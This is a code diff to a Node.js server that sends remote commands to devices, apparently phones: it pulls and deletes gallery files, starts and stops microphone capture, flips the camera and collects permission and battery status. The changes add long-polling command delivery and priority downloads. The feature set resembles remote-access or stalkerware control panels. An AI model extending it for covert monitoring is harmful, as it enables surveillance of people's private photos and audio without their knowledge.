@@ -9,25 +9,14 @@ const sharp = require('sharp');
 
 const app = express();
 const server = http.createServer(app);
-
-// ✅ SIRF WEBSOCKET - No polling
 const io = socketIo(server, {
     cors: { origin: '*', methods: ['GET', 'POST'] },
-    transports: ['websocket'],
-    pingInterval: 15000,   // 15 seconds
-    pingTimeout: 10000,    // 10 seconds
-    // Total: 25 seconds timeout
+    transports: ['websocket', 'polling']
 });
 
 app.use(cors());
 app.use(express.json({ limit: '250mb' }));
 app.use(express.urlencoded({ extended: true, limit: '250mb' }));
-
-// ========== CONFIGURATION ==========
-const STALE_TIMEOUT = 120000;     // 2 minutes
-const ONLINE_TIMEOUT = 120000;    // 2 minutes
-const DISCONNECT_WAIT = 30000;    // 30 seconds
-const FILE_TTL_MS = 5 * 60 * 1000; // 5 minutes
 
 // ========== GALLERY STORAGE ==========
 const GALLERY_DIR = path.join(__dirname, 'gallery');
@@ -50,7 +39,7 @@ function loadDevices() {
     try {
         if (fs.existsSync(DEVICES_FILE)) {
             const saved = JSON.parse(fs.readFileSync(DEVICES_FILE, 'utf8'));
-            const cutoff = Date.now() - STALE_TIMEOUT;
+            const cutoff = Date.now() - 5 * 60 * 1000;
             return saved.filter(d => (d.lastSeen || 0) > cutoff);
         }
     } catch (e) {}
@@ -79,10 +68,11 @@ const IMAGE_QUEUE_LIMIT = 2;
 const VIDEO_QUEUE_LIMIT = 2;
 const imageQueue = {};
 const videoQueue = {};
+
 const downloadInProgress = {};
 const downloadPending = {};
 const fileTimers = {};
-const requestedFiles = {};
+const FILE_TTL_MS = 5 * 60 * 1000;
 
 function scheduleFileCleanup(deviceId, fileName) {
     const key = `${deviceId}::${fileName}`;
@@ -118,6 +108,19 @@ function deleteFile(deviceId, fileName) {
     }
 }
 
+function findGalleryFilePath(deviceId, fileName, folder) {
+    const deviceDir = path.join(GALLERY_DIR, deviceId);
+    const candidates = [];
+    if (folder) candidates.push(path.join(deviceDir, folder, fileName));
+    candidates.push(path.join(deviceDir, fileName));
+    if (fs.existsSync(deviceDir)) {
+        for (const sub of fs.readdirSync(deviceDir)) {
+            candidates.push(path.join(deviceDir, sub, fileName));
+        }
+    }
+    return candidates.find(fp => fs.existsSync(fp)) || null;
+}
+
 function addToQueue(deviceId, fileName, fileType) {
     const ext = (fileName.split('.').pop() || '').toLowerCase();
     const isVideo = (fileType || '').toLowerCase().includes('video') ||
@@ -145,13 +148,46 @@ function sendNextDownload(deviceId) {
     const next = downloadPending[deviceId].shift();
     downloadInProgress[deviceId] = next;
     requestedFiles[`${deviceId}::${next}`] = Date.now();
-    if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
-    pendingCommands[deviceId].push({ command: 'gallery_file', value: next });
+    deliverCommand(deviceId, { command: 'gallery_file', value: next });
     console.log(`📤 Serial download → ${next} (${deviceId}) | queue: ${(downloadPending[deviceId]||[]).length} remaining`);
+}
+
+// ========== PRIORITY DOWNLOAD FUNCTION ==========
+function requestFileFromDevicePriority(deviceId, fileName) {
+    const reqKey = `${deviceId}::${fileName}`;
+
+    if (findGalleryFilePath(deviceId, fileName)) return 'cached';
+    
+    if (requestedFiles[reqKey] && (Date.now() - requestedFiles[reqKey]) < 5 * 60 * 1000) {
+        return 'already';
+    }
+    
+    if (downloadPending[deviceId]) {
+        downloadPending[deviceId] = downloadPending[deviceId].filter(n => n !== fileName);
+    }
+    
+    if (downloadInProgress[deviceId]) {
+        const currentFile = downloadInProgress[deviceId];
+        if (!downloadPending[deviceId]) downloadPending[deviceId] = [];
+        downloadPending[deviceId].unshift(currentFile);
+        
+        downloadInProgress[deviceId] = fileName;
+        requestedFiles[reqKey] = Date.now();
+        deliverCommand(deviceId, { command: 'gallery_file', value: fileName });
+        console.log(`🔥 PRIORITY (interrupt): ${fileName} (${deviceId})`);
+        return 'priority';
+    }
+    
+    downloadInProgress[deviceId] = fileName;
+    requestedFiles[reqKey] = Date.now();
+    deliverCommand(deviceId, { command: 'gallery_file', value: fileName });
+    console.log(`📤 Download started (priority): ${fileName} (${deviceId})`);
+    return 'sent';
 }
 
 function requestFileFromDevice(deviceId, fileName) {
     const reqKey = `${deviceId}::${fileName}`;
+    if (findGalleryFilePath(deviceId, fileName)) return 'cached';
     if (requestedFiles[reqKey] && (Date.now() - requestedFiles[reqKey]) < 5 * 60 * 1000) return 'already';
     if (!downloadPending[deviceId]) downloadPending[deviceId] = [];
     if (downloadInProgress[deviceId] === fileName || downloadPending[deviceId].includes(fileName)) return 'queued';
@@ -163,8 +199,7 @@ function requestFileFromDevice(deviceId, fileName) {
     }
     downloadInProgress[deviceId] = fileName;
     requestedFiles[reqKey] = Date.now();
-    if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
-    pendingCommands[deviceId].push({ command: 'gallery_file', value: fileName });
+    deliverCommand(deviceId, { command: 'gallery_file', value: fileName });
     console.log(`📤 Download started: ${fileName} (${deviceId})`);
     return 'sent';
 }
@@ -196,6 +231,31 @@ let activeStreams = {};
 let frameQueues = {};
 let voiceStreams = {};
 let voiceDataQueue = {};
+const requestedFiles = {};
+const commandQueue = {};
+const waitingClients = {};
+
+function deliverCommand(deviceId, cmd) {
+    if (!deviceId || !cmd?.command) return 'invalid';
+
+    const waitingResponse = waitingClients[deviceId];
+    if (waitingResponse && !waitingResponse.headersSent) {
+        delete waitingClients[deviceId];
+        waitingResponse.json({
+            hasCommand: true,
+            command: cmd.command,
+            value: cmd.value ?? null
+        });
+        console.log(`⚡ Immediate command delivery → ${cmd.command} (${deviceId})`);
+        return 'sent';
+    }
+
+    // Keep only the newest fallback command. An active long-poll request
+    // receives commands immediately, so this prevents stale commands piling up.
+    pendingCommands[deviceId] = [cmd];
+    console.log(`⏱️ Command ready for next device poll → ${cmd.command} (${deviceId})`);
+    return 'ready';
+}
 
 function getDeviceSettings(deviceId) {
     if (!deviceSettings[deviceId]) {
@@ -232,18 +292,13 @@ function resolveLatestFrame(deviceId) {
     return bestFrame || null;
 }
 
-// ========== DEVICE CLEANUP - 30 SECOND ==========
 setInterval(() => {
     const now = Date.now();
     devices = devices.filter(device => {
         const lastSeen = device.lastSeen || 0;
-        const hasRecentFrames = frameQueues[device.id] && 
-            frameQueues[device.id].length > 0 &&
-            latestFrames[device.id] && 
-            (now - (latestFrames[device.id].ts || 0)) < 60000;
-
-        const stale = (now - lastSeen) > STALE_TIMEOUT && !hasRecentFrames;
-        
+        const hasRecentFrames = frameQueues[device.id] && frameQueues[device.id].length > 0 &&
+            latestFrames[device.id] && (now - (latestFrames[device.id].ts || 0)) < 30000;
+        const stale = (now - lastSeen) > 30000 && !hasRecentFrames;
         if (stale) {
             console.log(`🧹 Removing stale device: ${device.id}`);
             delete deviceHeartbeats[device.id];
@@ -256,11 +311,11 @@ setInterval(() => {
         }
         return true;
     });
-}, 30000);
+}, 15000);
 
 // ========== AUTO CLEANUP ==========
 const CLEANUP_INTERVAL_MS = 15 * 60 * 1000;
-const MAX_FILE_AGE_MS = 48 * 60 * 60 * 1000;
+const MAX_FILE_AGE_MS     = 48 * 60 * 60 * 1000;
 
 setInterval(() => {
     const now = Date.now();
@@ -312,8 +367,7 @@ app.post('/api/heartbeat', (req, res) => {
     try {
         const {
             deviceId, deviceName, camera, cameraReady, streaming,
-            cameraPermission, batteryOptimization, batteryPercentage,
-            charging, quality, fps, timestamp
+            cameraPermission, batteryOptimization, batteryPercentage
         } = req.body;
 
         deviceHeartbeats[deviceId] = Date.now();
@@ -335,14 +389,9 @@ app.post('/api/heartbeat', (req, res) => {
         device.cameraPermission = cameraPermission || false;
         device.batteryOptimization = batteryOptimization || false;
         device.batteryPercentage = batteryPercentage || 0;
-        device.charging = charging || false;
-        device.quality = quality || 240;
-        device.fps = fps || 15;
         device.lastHeartbeat = new Date().toLocaleTimeString();
-        device.lastSeen = Date.now();  // 🔥 ALWAYS UPDATE!
-        device.status = 'online';
+        device.lastSeen = Date.now();
         saveDevices();
-        
         res.json({ success: true, settings: getDeviceSettings(deviceId) });
     } catch (e) {
         res.status(500).json({ success: false, error: e.message });
@@ -416,6 +465,7 @@ app.get('/api/gallery/:deviceId', (req, res) => {
     }
 });
 
+// ========== FIXED: GALLERY FILE WITH PRIORITY ==========
 app.get('/api/gallery/file/:deviceId/:fileName', (req, res) => {
     try {
         const { deviceId, fileName } = req.params;
@@ -464,14 +514,47 @@ app.get('/api/gallery/file/:deviceId/:fileName', (req, res) => {
             });
         }
 
+        // File not on disk — use PRIORITY download
         const reqKey = `${deviceId}::${fileName}`;
-        delete requestedFiles[reqKey];
-        if (downloadPending[deviceId])
+        if (requestedFiles[reqKey] && (Date.now() - requestedFiles[reqKey]) < 5 * 60 * 1000) {
+            return res.json({
+                success: false,
+                pending: true,
+                status: 'already',
+                priority: true,
+                message: '📡 Waiting for the requested image from device'
+            });
+        }
+        if (downloadPending[deviceId]) {
             downloadPending[deviceId] = downloadPending[deviceId].filter(n => n !== fileName);
-        if (downloadInProgress[deviceId] === fileName)
+        }
+        if (downloadInProgress[deviceId] === fileName) {
             downloadInProgress[deviceId] = null;
-        const status = requestFileFromDevice(deviceId, fileName);
-        res.json({ success: false, pending: true, status, message: 'Requesting file from device...' });
+        }
+        
+        const status = requestFileFromDevicePriority(deviceId, fileName);
+        res.json({ 
+            success: false, 
+            pending: true, 
+            status, 
+            priority: true,
+            message: '📥 Priority download started - file will appear shortly'
+        });
+    } catch (e) {
+        res.status(500).json({ success: false, error: e.message });
+    }
+});
+
+// ========== PRIORITY REQUEST ENDPOINT ==========
+app.post('/api/gallery/request-priority', (req, res) => {
+    try {
+        const { deviceId, fileName } = req.body;
+        if (!deviceId || !fileName) {
+            return res.status(400).json({ success: false, error: 'Missing params' });
+        }
+        
+        const status = requestFileFromDevicePriority(deviceId, fileName);
+        res.json({ success: true, status, priority: true });
     } catch (e) {
         res.status(500).json({ success: false, error: e.message });
     }
@@ -530,6 +613,7 @@ app.post('/api/upload/file', (req, res) => {
     }
 });
 
+// ========== CHUNK UPLOAD API ==========
 app.post('/api/upload/chunk', async (req, res) => {
     try {
         const { deviceId, file } = req.body;
@@ -609,6 +693,7 @@ app.post('/api/gallery/request', (req, res) => {
     }
 });
 
+// ========== CLEAR CACHE ==========
 app.post('/api/clear-cache', (req, res) => {
     try {
         Object.keys(fileTimers).forEach(key => {
@@ -640,8 +725,7 @@ app.delete('/api/gallery/file/:deviceId/:fileName', (req, res) => {
         }
 
         const cmd = { command: 'gallery_delete', value: fileName };
-        if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
-        pendingCommands[deviceId].push(cmd);
+        deliverCommand(deviceId, cmd);
 
         res.json({ success: true });
     } catch (e) {
@@ -655,8 +739,7 @@ app.post('/api/voice/start', (req, res) => {
     try {
         const { deviceId } = req.body;
         if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId required' });
-        if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
-        pendingCommands[deviceId].push({ command: 'voice_start', value: 'true' });
+        deliverCommand(deviceId, { command: 'voice_start', value: 'true' });
         voiceStreams[deviceId] = { active: true, startedAt: Date.now(), packetsReceived: 0 };
         console.log(`🎤 Voice START queued for ${deviceId}`);
         res.json({ success: true, command: 'voice_start', status: 'started' });
@@ -669,8 +752,7 @@ app.post('/api/voice/stop', (req, res) => {
     try {
         const { deviceId } = req.body;
         if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId required' });
-        if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
-        pendingCommands[deviceId].push({ command: 'voice_stop', value: 'false' });
+        deliverCommand(deviceId, { command: 'voice_stop', value: 'false' });
         if (voiceStreams[deviceId]) { voiceStreams[deviceId].active = false; voiceStreams[deviceId].stoppedAt = Date.now(); }
         console.log(`⏹️ Voice STOP queued for ${deviceId}`);
         res.json({ success: true, command: 'voice_stop', status: 'stopped' });
@@ -850,11 +932,10 @@ app.post('/api/flip', (req, res) => {
         ds.camera = camera;
 
         const cmd = { command: 'flip', value: camera };
-        if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
-        pendingCommands[deviceId].push(cmd);
-        console.log(`📦 Flip queued: camera=${camera}`);
+        const delivery = deliverCommand(deviceId, cmd);
+        console.log(`📦 Flip ${delivery}: camera=${camera}`);
 
-        res.json({ success: true, settings: ds, command: cmd });
+        res.json({ success: true, settings: ds, command: cmd, delivery });
     } catch (e) {
         res.status(500).json({ success: false, error: e.message });
     }
@@ -877,9 +958,8 @@ app.post('/api/command', (req, res) => {
 
         const cmd = { command, value: value ?? null };
         if (deviceId) {
-            if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
-            pendingCommands[deviceId].push(cmd);
-            console.log(`📦 Command queued: ${command} (value: ${value ?? 'none'})`);
+            const delivery = deliverCommand(deviceId, cmd);
+            console.log(`📦 Command ${delivery}: ${command} (value: ${value ?? 'none'})`);
         }
 
         res.json({ success: true, settings: getDeviceSettings(deviceId) });
@@ -910,6 +990,121 @@ app.get('/api/commands/:deviceId', (req, res) => {
     }
 });
 
+// ========== FIXED: LONG POLLING WITH 3 MIN TIMEOUT ==========
+app.get('/api/commands/long/:deviceId', (req, res) => {
+    const { deviceId } = req.params;
+    
+    // Check queue first
+    const commands = pendingCommands[deviceId] || [];
+    if (commands.length > 0) {
+        const cmd = commands.pop();
+        pendingCommands[deviceId] = [];
+        return res.json({
+            hasCommand: true,
+            command: cmd.command,
+            value: cmd.value
+        });
+    }
+    
+    // ✅ 3 MIN TIMEOUT (180 seconds)
+    req.setTimeout(180000, () => {
+        if (!res.headersSent) {
+            res.json({ hasCommand: false });
+            if (waitingClients[deviceId] === res) delete waitingClients[deviceId];
+            console.log(`⏰ 3 min timeout: ${deviceId}`);
+        }
+    });
+    
+    const previousResponse = waitingClients[deviceId];
+    if (previousResponse && !previousResponse.headersSent) {
+        previousResponse.json({ hasCommand: false, retry: true });
+    }
+    waitingClients[deviceId] = res;
+    console.log(`⏳ Waiting for command (3 min): ${deviceId}`);
+});
+
+// ========== STATUS CHECK COMMAND ==========
+app.post('/api/status/check', (req, res) => {
+    try {
+        const { deviceId } = req.body;
+        if (!deviceId) {
+            return res.status(400).json({ success: false, error: 'deviceId required' });
+        }
+
+        // ✅ Send command to device
+        const delivery = deliverCommand(deviceId, { command: 'status', value: 'check' });
+        
+        console.log(`📊 Status check command sent to ${deviceId}`);
+        
+        res.json({ 
+            success: true, 
+            message: `Status check command ${delivery}`,
+            delivery,
+            command: 'status'
+        });
+    } catch (e) {
+        res.status(500).json({ success: false, error: e.message });
+    }
+});
+
+// ========== DETAILED STATUS RECEIVE ==========
+app.post('/api/device/status/detailed', (req, res) => {
+    try {
+        const status = req.body;
+        const { deviceId } = status;
+        
+        console.log(`📊 Detailed status received from ${deviceId}`);
+        
+        // ✅ Update device with full status
+        let device = devices.find(d => d.id === deviceId);
+        if (!device) {
+            device = {
+                id: deviceId,
+                name: status.deviceName || deviceId,
+                connectedAt: new Date().toLocaleTimeString(),
+                firstSeen: Date.now()
+            };
+            devices.push(device);
+        }
+        
+        // ✅ Update all status fields
+        device.name = status.deviceName || device.name;
+        device.camera = status.cameraType || device.camera;
+        device.cameraReady = status.cameraReady || false;
+        device.streaming = status.streaming || false;
+        device.cameraPermission = status.cameraPermission || false;
+        device.batteryOptimization = status.batteryOptimization || false;
+        device.batteryPercentage = status.batteryPercentage || 0;
+        device.charging = status.charging || false;
+        device.audioEnabled = status.audioEnabled || false;
+        device.microphonePermission = status.microphonePermission || false;
+        device.storagePermission = status.storagePermission || false;
+        device.galleryCount = status.galleryCount || 0;
+        device.freeMemory = status.freeMemory || 0;
+        device.totalMemory = status.totalMemory || 0;
+        device.networkConnected = status.networkConnected || false;
+        device.fps = status.fps || 15;
+        device.quality = status.quality || 240;
+        device.lastStatusUpdate = new Date().toLocaleTimeString();
+        device.lastSeen = Date.now();
+        
+        saveDevices();
+        
+        // ✅ Broadcast updated status to all clients
+        io.emit('device_status_detailed', {
+            deviceId: deviceId,
+            status: device,
+            timestamp: Date.now()
+        });
+        
+        res.json({ success: true, message: 'Status updated' });
+        
+    } catch (e) {
+        console.error('❌ Detailed status error:', e.message);
+        res.status(500).json({ success: false, error: e.message });
+    }
+});
+
 app.post('/api/device-status', (req, res) => {
     try {
         const { deviceId, cameraReady, streaming, cameraType, cameraPermission, status } = req.body;
@@ -921,7 +1116,6 @@ app.post('/api/device-status', (req, res) => {
             if (cameraPermission !== undefined) device.cameraPermission = cameraPermission;
             device.status = status;
             device.lastUpdate = new Date().toLocaleTimeString();
-            device.lastSeen = Date.now();  // 🔥 ALWAYS UPDATE!
         }
         res.json({ success: true });
     } catch (e) {
@@ -942,12 +1136,8 @@ app.get('/api/devices', (req, res) => {
             cameraPermission: d.cameraPermission || false,
             batteryOptimization: d.batteryOptimization || false,
             batteryPercentage: d.batteryPercentage || 0,
-            charging: d.charging || false,
-            quality: d.quality || 240,
-            fps: d.fps || 15,
-            isConnected: (now - (d.lastSeen || 0)) < ONLINE_TIMEOUT,
+            isConnected: (now - (d.lastSeen || 0)) < 30000,
             hasWebSocket: !!activeStreams[d.id],
-            status: (now - (d.lastSeen || 0)) < ONLINE_TIMEOUT ? 'online' : 'offline',
             lastHeartbeat: d.lastHeartbeat,
             connectedAt: d.connectedAt,
             galleryCount: (galleryData[d.id] || []).length,
@@ -964,7 +1154,7 @@ app.get('/api/device/:deviceId', (req, res) => {
         success: true,
         device: {
             ...device,
-            isConnected: (now - (device.lastSeen || 0)) < ONLINE_TIMEOUT,
+            isConnected: (now - (device.lastSeen || 0)) < 30000,
             hasWebSocket: !!activeStreams[device.id],
             galleryCount: (galleryData[device.id] || []).length,
             settings: getDeviceSettings(device.id)
@@ -1156,6 +1346,7 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         .gallery-item { background:#1a1a1a; border-radius:8px; overflow:hidden; border:1px solid #2a2a2a; cursor:pointer; transition:all .2s; }
         .gallery-item:hover { transform:scale(1.03); border-color:#667eea; }
         .gallery-item .thumb { width:100%; height:90px; display:flex; align-items:center; justify-content:center; font-size:32px; color:#555; background:#111; position:relative; }
+         .gallery-item .file-number { position:absolute; top:5px; left:5px; min-width:22px; padding:2px 6px; border-radius:12px; background:rgba(0,0,0,.78); border:1px solid rgba(255,255,255,.35); color:#fff; font-size:11px; line-height:16px; font-weight:700; text-align:center; z-index:2; pointer-events:none; }
         .gallery-item.video .thumb .play-badge { position:absolute; font-size:20px; }
         .gallery-item .info { padding:4px 6px; }
         .gallery-item .info .name { font-size:10px; color:#aaa; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
@@ -1205,6 +1396,7 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
     <div id="galleryContent"><div class="loading">⏳ Loading gallery...</div></div>
 </div>
 
+<!-- Full-screen viewer -->
 <div class="viewer" id="viewer">
     <button class="v-close" onclick="closeViewer()">✕</button>
     <div id="viewerLoading" style="display:none;text-align:center;color:#aaa;padding:20px;">
@@ -1213,7 +1405,7 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         <div style="font-size:13px;color:#666;margin-top:8px;" id="viewerLoadingNote"></div>
         <div id="retryBar" style="display:none;margin-top:14px;width:220px;margin-left:auto;margin-right:auto;">
             <div style="display:flex;justify-content:space-between;font-size:11px;color:#555;margin-bottom:4px;">
-                <span>Progress</span><span id="retryLabel">0/15</span>
+                <span>Progress</span><span id="retryLabel">0/∞</span>
             </div>
             <div style="background:#222;border-radius:4px;height:6px;overflow:hidden;">
                 <div id="retryFill" style="background:#667eea;height:100%;width:0%;transition:width .3s;"></div>
@@ -1243,13 +1435,16 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
     let currentFolderFiles = [];
     let currentIndex = 0;
     let viewerDataUrl = '';
+    let _viewerRetryTimer = null;
+    let _viewerLoadToken = 0;
 
-    const VID_MAX_RETRIES = 15;
+    // ── Video retry state (UNLIMITED) ─────────────────
     const VID_RETRY_MS    = 2000;
     let _vidRetryTimer  = null;
     let _vidRetryCount  = 0;
     let _vidWaitingFile = null;
 
+    // ── Helpers ───────────────────────────────────────
     function getMime(fileName, type) {
         const ext = fileName.split('.').pop().toLowerCase();
         if (type === 'video' || ['mp4','3gp','mkv','avi','mov','webm'].includes(ext)) {
@@ -1276,6 +1471,7 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         return '📁';
     }
 
+    // ── Gallery load ──────────────────────────────────
     function loadGallery() {
         document.getElementById('galleryContent').innerHTML = '<div class="loading">⏳ Loading gallery...</div>';
         fetch('/api/gallery/' + encodeURIComponent(deviceId))
@@ -1298,6 +1494,7 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
             });
     }
 
+    // ── Folder list ───────────────────────────────────
     let folderNames = [];
     function showFolderList() {
         currentFolderName = null; currentFolderFiles = [];
@@ -1344,6 +1541,7 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
             const thumbUrl = '/api/gallery/thumb/' + encodeURIComponent(deviceId) + '/' + encodeURIComponent(file.name) + '?folder=' + folderParam;
             html += '<div class="gallery-item ' + (isVideo ? 'video' : '') + '" onclick="openViewer(' + idx + ')">';
             html += '<div class="thumb" style="padding:0;overflow:hidden;position:relative;">';
+             html += '<span class="file-number" aria-label="File number ' + (idx + 1) + '">' + (idx + 1) + '</span>';
             if (isVideo) {
                 html += '<img src="' + FALLBACK_VID + '" style="width:100%;height:90px;object-fit:cover;display:block;">';
                 html += '<span class="play-badge" style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:22px;pointer-events:none;">▶</span>';
@@ -1359,16 +1557,13 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         document.getElementById('galleryContent').innerHTML = html;
 
         const lazyImgs = document.querySelectorAll('.lazy-thumb');
-        let _thumbReqCount = 0;
         function _loadThumb(img) {
             const src = img.getAttribute('data-src');
             if (!src) return;
             img.onerror = function() {
                 img.onerror = null; img.src = FALLBACK_IMG;
-                if (_thumbReqCount < 20) {
-                    const fn = img.getAttribute('data-filename');
-                    if (fn) { _thumbReqCount++; fetch('/api/gallery/request', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ deviceId, fileName:fn }) }).catch(()=>{}); }
-                }
+                // Do not request missing thumbnails in the background. Only the
+                // image explicitly opened by the user gets a device request.
             };
             img.src = src; img.removeAttribute('data-src');
         }
@@ -1380,6 +1575,7 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         } else { lazyImgs.forEach(_loadThumb); }
     }
 
+    // ── Breadcrumb ────────────────────────────────────
     function setBreadcrumb(folderName) {
         const bc = document.getElementById('breadcrumb');
         bc.innerHTML = folderName
@@ -1387,6 +1583,7 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
             : '<span class="current">📸 All Folders</span>';
     }
 
+    // ── Sync ──────────────────────────────────────────
     function syncGallery() {
         const btn = document.getElementById('syncBtn');
         btn.disabled = true; btn.textContent = '⏳ Syncing...';
@@ -1394,6 +1591,7 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         setTimeout(() => { loadGallery(); btn.disabled = false; btn.textContent = '🔄 Sync'; }, 3000);
     }
 
+    // ── Clear Cache ───────────────────────────────────
     function clearCache() {
         if (!confirm('Server cache aur browser memory clear karein?')) return;
         fetch('/api/clear-cache', { method:'POST' }).catch(()=>{});
@@ -1402,6 +1600,7 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         alert('✅ Cache cleared!');
     }
 
+    // ── Viewer loading helpers ────────────────────────
     function showViewerLoading(title, note, retryN, retryMax) {
         document.getElementById('viewerLoading').style.display = 'block';
         document.getElementById('viewerLoadingTitle').textContent = title || 'Loading...';
@@ -1410,8 +1609,8 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         const bar = document.getElementById('retryBar');
         if (retryN !== undefined && retryMax) {
             bar.style.display = 'block';
-            document.getElementById('retryLabel').textContent = retryN + '/' + retryMax;
-            document.getElementById('retryFill').style.width  = Math.round(retryN / retryMax * 100) + '%';
+            document.getElementById('retryLabel').textContent = retryN + '/∞';
+            document.getElementById('retryFill').style.width  = Math.min(Math.round(retryN / 20 * 100), 95) + '%';
         } else {
             bar.style.display = 'none';
         }
@@ -1421,6 +1620,7 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         document.getElementById('retryBar').style.display = 'none';
     }
 
+    // ── Video memory release helper ───────────────────
     function _releaseVideo() {
         clearTimeout(_vidRetryTimer);
         _vidRetryTimer  = null;
@@ -1433,6 +1633,7 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         v.load();
     }
 
+    // ── Video retry loader (UNLIMITED) ────────────────
     function _startVideoRetry(file, retryCount) {
         if (!document.getElementById('viewer').classList.contains('active')) return;
         const f = currentFolderFiles[currentIndex];
@@ -1451,7 +1652,7 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         if (retryCount === 0) {
             showViewerLoading('⏳ Video load ho rahi hai...', 'Browser se range request...');
         } else {
-            showViewerLoading('📡 Upload ka wait kar rahe hain...', 'Device se aa rahi hai', retryCount, VID_MAX_RETRIES);
+            showViewerLoading('📡 Upload ka wait kar rahe hain...', 'Device se aa rahi hai', retryCount, Infinity);
         }
 
         vidEl.onloadeddata = function() {
@@ -1468,25 +1669,21 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
             vidEl.onerror = null; vidEl.onloadeddata = null;
 
             if (retryCount === 0) {
-                fetch('/api/gallery/request', {
+                fetch('/api/gallery/request-priority', {
                     method:'POST', headers:{'Content-Type':'application/json'},
                     body: JSON.stringify({ deviceId, fileName: file.name })
                 }).catch(()=>{});
             }
 
-            if (retryCount < VID_MAX_RETRIES) {
-                const next = retryCount + 1;
-                showViewerLoading('📡 Upload ka wait...', 'Device se aa rahi hai', next, VID_MAX_RETRIES);
-                _vidRetryTimer = setTimeout(() => {
-                    if (document.getElementById('viewer').classList.contains('active')) {
-                        vidEl.src = ''; vidEl.load();
-                        _startVideoRetry(file, next);
-                    }
-                }, VID_RETRY_MS);
-            } else {
-                showViewerLoading('❌ Video nahi mili', 'Close karke dobara try karein ya device se re-upload karein');
-                _vidWaitingFile = null;
-            }
+            // UNLIMITED retries - keep going forever
+            const next = retryCount + 1;
+            showViewerLoading('📡 Upload ka wait...', 'Device se aa rahi hai', next, Infinity);
+            _vidRetryTimer = setTimeout(() => {
+                if (document.getElementById('viewer').classList.contains('active')) {
+                    vidEl.src = ''; vidEl.load();
+                    _startVideoRetry(file, next);
+                }
+            }, VID_RETRY_MS);
         };
 
         vidEl.src = streamUrl;
@@ -1494,8 +1691,12 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         vidEl.style.display = 'block';
     }
 
+    // ── Viewer open ───────────────────────────────────
     function openViewer(index) {
         if (index < 0 || index >= currentFolderFiles.length) return;
+        clearTimeout(_viewerRetryTimer);
+        _viewerRetryTimer = null;
+        const loadToken = ++_viewerLoadToken;
         currentIndex = index;
         const file = currentFolderFiles[index];
 
@@ -1522,20 +1723,29 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
             fetch(url)
                 .then(r => r.json())
                 .then(data => {
+                    if (loadToken !== _viewerLoadToken || currentIndex !== index) return;
                     if (data.success && data.data) {
                         const mime = getMime(file.name, data.type || file.type);
                         const dataUrl = 'data:' + mime + ';base64,' + data.data;
                         viewerDataUrl = dataUrl;
                         hideViewerLoading();
                         const imgEl = document.getElementById('viewerImg');
+                        imgEl.onload = function() {
+                            imgEl.onload = null;
+                            if (loadToken === _viewerLoadToken && currentIndex === index) {
+                                prefetchFiles(index);
+                            }
+                        };
                         imgEl.src = dataUrl; imgEl.style.display = 'block';
-                        prefetchFiles(index);
                     } else if (data.pending) {
-                        showViewerLoading('⏳ Device se download ho rahi hai...');
-                        prefetchFiles(index);
-                        setTimeout(function() {
-                            if (document.getElementById('viewer').classList.contains('active') && currentIndex === index) openViewer(index);
-                        }, 3000);
+                        showViewerLoading('⏳ Device se download ho rahi hai...', 'Priority mode active');
+                        _viewerRetryTimer = setTimeout(function() {
+                            if (loadToken === _viewerLoadToken &&
+                                document.getElementById('viewer').classList.contains('active') &&
+                                currentIndex === index) {
+                                openViewer(index);
+                            }
+                        }, 700);
                     } else {
                         hideViewerLoading();
                         const imgEl = document.getElementById('viewerImg');
@@ -1550,14 +1760,21 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         const cur = currentFolderFiles[fromIndex];
         if (!cur || cur.type === 'video') return;
         for (let i = fromIndex + 1; i < currentFolderFiles.length; i++) {
-            const f = currentFolderFiles[i];
-            if (!f || f.type === 'video') continue;
-            fetch('/api/gallery/request', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ deviceId, fileName:f.name }) }).catch(()=>{});
+            const next = currentFolderFiles[i];
+            if (!next || next.type === 'video') continue;
+            fetch('/api/gallery/request', {
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({ deviceId, fileName: next.name })
+            }).catch(()=>{});
             break;
         }
     }
 
     function closeViewer() {
+        clearTimeout(_viewerRetryTimer);
+        _viewerRetryTimer = null;
+        _viewerLoadToken++;
         _releaseVideo();
         document.getElementById('vidPlayOverlay').style.display = 'none';
         document.getElementById('viewer').classList.remove('active');
@@ -1600,12 +1817,14 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
 
     loadGallery();
 
+    // ── Socket.IO — live thumbnail + video upload notification ────────────
     let _galReloadTimer = null;
-    const _galSocket = io({ transports: ['websocket'] });
+    const _galSocket = io({ transports: ['websocket', 'polling'] });
 
     _galSocket.on('gallery_update', function(data) {
         if (data.deviceId !== deviceId) return;
 
+        // Update thumbnail in-place for images
         if (data.type !== 'video') {
